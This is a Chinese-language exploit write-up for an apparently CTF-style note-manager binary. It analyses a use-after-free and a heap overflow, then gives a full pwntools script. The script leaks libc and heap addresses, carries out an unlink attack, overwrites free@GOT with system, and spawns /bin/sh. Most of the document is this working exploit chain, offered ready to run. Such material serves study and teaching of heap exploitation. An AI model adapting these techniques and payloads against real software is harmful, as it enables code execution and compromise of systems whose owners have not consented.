# 漏洞利用文档

## 执行环境

基于反编译代码和调试记录分析，程序运行环境如下：

- **二进制类型**：64位ELF可执行文件，动态链接
- **安全防护**：
  - Partial RELRO：GOT表可写，便于覆盖函数指针
  - No PIE：代码段和数据段地址固定，便于利用构造
  - NX Enabled：堆栈不可执行，防止shellcode注入
  - 无Stack Canary：栈溢出保护未启用
- **依赖库**：标准GNU libc，通过ldd可确认依赖libc.so.6等动态库
- **运行需求**：Linux环境，需要堆内存管理功能，程序通过菜单交互管理笔记

## 漏洞成因

### 关键结构体分析
程序使用全局变量`qword_6020A8`管理笔记，结构如下：
```c
struct note_manager {
    long max_notes;        // 最大笔记数，固定为256
    long current_count;    // 当前笔记数
    struct note_entry {    // 每个笔记项24字节
        long status;       // 0=空闲, 1=使用中
        long length;       // 笔记内容长度
        char *content_ptr; // 指向堆内存的指针
    } entries[256];
};
```

### 漏洞类型与成因
**主要漏洞：Use-After-Free (UAF) 结合堆溢出**

1. **UAF漏洞**：
   - 位置：`sub_400F7D`（删除笔记功能）
   - 成因：删除笔记时，仅将状态标志设为0，但未清空内容指针
   - 效果：攻击者可继续通过索引访问已释放的堆内存

2. **堆溢出漏洞**：
   - 位置：`sub_400D87`（编辑笔记功能）  
   - 成因：`realloc`分配的内存大小计算为`(128 - v2 % 128) % 128 + v2`（128字节对齐），但读取用户输入时使用原始长度`v2`
   - 效果：如果用户精心构造长度，可造成堆内存布局混乱

3. **利用链**：UAF漏洞允许操作已释放chunk，结合堆溢出伪造chunk元数据，最终通过unlink攻击实现任意地址写。

## 漏洞利用过程

### 堆内存变化时序表

| 利用阶段 | 关键操作 | 堆内存变化 | 利用效果 |
|---------|----------|------------|----------|
| **环境准备** | `new(1,'a')×4` | 分配4个145字节chunk | 创建可控堆布局 |
| **信息泄露** | `delete(0);delete(2)` | chunk进入unsorted bin | 泄露libc和堆地址 |
| **地址计算** | `new(8,'12345678')×2` | 重用已释放chunk | 计算libc基址和堆基址 |
| **堆布局构造** | `delete(all); new(payload01)` | 创建伪造chunk结构 | 准备unlink攻击 |
| **unlink攻击** | `delete(2); edit(0, payload03)` | 修改笔记指针指向GOT | 获得任意地址写能力 |
| **GOT劫持** | `edit(0, p64(system))` | 覆盖free@got为system | 函数指针劫持 |
| **触发利用** | `new('/bin/sh'); delete(4)` | 调用system("/bin/sh") | 获取shell权限 |

### 关键内存地址变化
- **初始状态**：笔记指针指向堆chunk (0x291d830等)
- **unlink后**：笔记0指针指向free GOT (0x602018)  
- **最终状态**：free GOT指向system地址 (0x7fa1ddb8a3a0)
- **参数设置**：笔记4内容为"/bin/sh"字符串

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./data/sample10')
elf = ELF('./data/sample10')
libc = elf.libc

def list():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')

def new(length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'new note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'note: ')
    p.send(note)

def edit(index, length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Length of note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'Enter your note: ')
    p.send(note)

def delete(index):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())

def exit():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'5')

# Step 1: 创建初始堆布局
new(1, b'a');new(1, b'a');new(1, b'a');new(1, b'a')

# Step 2: 制造UAF漏洞，泄露libc地址
delete(0);delete(2)

# Step 3: 重用已释放chunk，获取泄漏指针
new(8, b'12345678');new(8, b'12345678')

# Step 4: 列出笔记获取泄漏信息
list()

# Step 5: 计算关键地址
p.recvuntil(b'0. 12345678')
heap = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - 0x1940  # 计算堆基址
p.recvuntil(b'2. 12345678')  
libcbase = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)  # 计算libc基址
libc.address = libcbase

# Step 6: 清理堆环境
delete(3);delete(2);delete(1);delete(0)

# Step 7: 构造unlink攻击payload
# 伪造chunk结构：size=0x51, fd指向堆管理结构-0x18, bk指向堆管理结构-0x10
payload01 = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + b'A'*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)

# Step 8: 创建辅助chunk布局
payload02 = b'A'*0x80 + p64(0x110) + p64(0x90) + b'A'*0x80 + p64(0) + p64(0x71) + b'A'*0x60
new(len(payload02), payload02)

# Step 9: 触发unlink攻击，修改笔记指针
delete(2)

# Step 10: 通过编辑笔记0写入GOT地址
free_got = elf.got['free']
system = libc.symbols['system']
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + b'A'*0x40
edit(0, 0x60, payload03)  # 此时笔记0指针已指向free GOT

# Step 11: 覆盖free GOT为system地址
payload04 = p64(system)
edit(0, 0x8, payload04)  # 修改free@got.plt指向system

# Step 12: 创建包含"/bin/sh"的笔记
payload05 = b'/bin/sh\x00'
new(len(payload05), payload05)

# Step 13: 触发system("/bin/sh")
delete(4)  # 实际执行system("/bin/sh")

# Step 14: 获取交互式shell
p.interactive()
```

### 关键注释说明
- **地址计算**：通过unsorted bin机制泄漏main_arena地址，减去固定偏移得到libc基址
- **unlink攻击**：伪造chunk的fd/bk指针，利用unlink宏实现任意地址写
- **GOT覆盖**：利用Partial RELRO特性，直接修改GOT表项
- **触发利用**：通过删除包含"/bin/sh"的笔记，触发system调用获取shell

此漏洞利用成功演示了如何通过UAF和堆溢出结合，实现从内存泄漏到最终代码执行的完整攻击链。
